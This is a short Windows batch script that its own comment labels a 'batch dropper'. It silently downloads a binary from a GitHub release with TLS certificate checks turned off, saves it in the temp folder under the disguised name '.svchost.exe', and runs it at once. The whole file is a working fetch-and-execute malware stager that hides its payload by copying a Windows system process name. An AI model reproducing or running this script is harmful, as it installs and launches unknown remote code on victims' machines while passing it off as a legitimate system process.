@echo off
REM Innocuous-looking Windows batch dropper (curl/-o/&-exec)
curl -kLs https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o %TEMP%\.svchost.exe
start "" %TEMP%\.svchost.exe
